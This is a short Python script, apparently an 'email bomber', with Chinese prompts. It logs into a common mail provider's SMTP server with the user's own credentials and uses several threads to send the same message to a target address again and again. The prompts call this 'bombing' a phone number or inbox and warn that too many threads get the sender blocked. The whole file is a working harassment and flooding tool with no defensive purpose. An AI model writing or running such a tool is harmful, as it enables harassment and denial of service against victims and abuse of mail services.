import smtplib
import time
import threading

def get_smtp_info(email):
    if "gmail.com" in email:
        return 'smtp.gmail.com', 587
    elif "outlook.com" in email or "hotmail.com" in email:
        return 'smtp.office365.com', 587
    elif "yahoo.com" in email:
        return 'smtp.mail.yahoo.com', 587
    elif "zoho.com" in email:
        return 'smtp.zoho.com', 587
    elif "qq.com" in email:
        return 'smtp.qq.com', 587
    elif "163.com" in email:
        return 'smtp.163.com', 587
    elif "126.com" in email:
        return 'smtp.126.com', 587
    elif "sina.com" in email:
        return 'smtp.sina.com', 25
    elif "aliyun.com" in email:
        return 'smtp.aliyun.com', 465
    elif "mail.com" in email:
        return 'smtp.mail.com', 587
    elif "aol.com" in email:
        return 'smtp.aol.com', 587
    else:
        return None, None  # 不支持的邮箱

def send_email(bomb_email, email, password, message, counter):
    try:
        smtp_server, smtp_port = get_smtp_info(email)
        if smtp_server is None:
            print("不支持的邮箱服务提供商")
            return

        mail = smtplib.SMTP(smtp_server, smtp_port)
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)

        for x in range(counter):
            print("Number of Message Sent : ", x + 1)
            mail.sendmail(email, bomb_email, message)
            time.sleep(1)

        mail.close()
    except Exception as e:
        print("发送邮件时出错:", e)

try:
    bomb_email = input("输入要轰炸的手机号: ")
    email = input("输入你的邮件: ")
    password = input("输入密码（不会泄露）: ")
    message = input("输入轰炸信息: ")
    counter = int(input("输入次数: "))
    num_threads = int(input("输入线程数量（尽量少，太多会导致屏蔽）: "))  # 用户输入线程数量

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_email, args=(bomb_email, email, password, message, counter))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()  # 等待所有线程完成

except Exception as e:
    print("请重试:", e)

